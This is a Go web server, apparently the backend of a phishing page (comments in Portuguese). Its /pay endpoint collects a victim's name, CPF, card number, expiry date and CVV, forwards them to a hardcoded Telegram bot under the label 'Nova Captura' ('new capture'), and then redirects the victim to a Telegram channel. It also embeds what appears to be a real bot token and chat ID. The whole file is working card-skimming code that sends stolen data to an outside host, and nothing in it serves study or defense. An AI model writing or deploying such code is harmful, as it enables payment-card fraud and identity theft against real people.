package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
)

// CONFIGURAÇÕES DO SEU BOT
const (
	botToken = "8425756950:AAGwzx4hX2rFhZ-VWEJ_2kLa6olnIF8GjoI" 
	chatID   = "7331217418" 
)

// Função que dispara os dados para o seu Telegram
func sendToTelegram(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	data := url.Values{
		"chat_id": {chatID},
		"text":    {text},
		"parse_mode": {"Markdown"},
	}
	// Usamos o retorno para verificar se o envio funcionou
	_, err := http.PostForm(apiURL, data)
	if err != nil {
		fmt.Printf("Erro ao enviar para o Telegram: %s\n", err)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	// CORS para permitir que o Netlify acesse sua API no Render
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	// Se for uma requisição de pre-flight (comum em navegadores), apenas retorna OK
	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method == "POST" {
		err := r.ParseForm()
		if err != nil {
			http.Error(w, "Erro ao processar formulário", http.StatusBadRequest)
			return
		}

		// Monta o log
		msg := fmt.Sprintf("💳 *Nova Captura Otterly*\n\n"+
			"*Nome:* %s\n"+
			"*CPF:* %s\n"+
			"*Cartão:* %s\n"+
			"*Exp:* %s\n"+
			"*CVV:* %s",
			r.FormValue("nome"), 
			r.FormValue("cpf"), 
			r.FormValue("cartao"), 
			r.FormValue("validade"), 
			r.FormValue("cvv"))

		sendToTelegram(msg)

		// Link do canal enviado por você
		canalVIP := "https://t.me/+BWgYKAExUIU3ZTBh"
		http.Redirect(w, r, canalVIP, http.StatusSeeOther)
		return
	}

	fmt.Fprintf(w, "Servidor Otterly On-line e Protegido.")
}

func main() {
	// O Render usa a porta dinâmica
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080" 
	}

	http.HandleFunc("/pay", handler)

	fmt.Printf("Iniciando servidor na porta %s...\n", port)
	// ListenAndServe bloqueia a execução, então capturamos o erro se ele falhar ao iniciar
	if err := http.ListenAndServe(":"+port, nil); err != nil {
		fmt.Printf("Erro fatal no servidor: %s\n", err)
	}
}
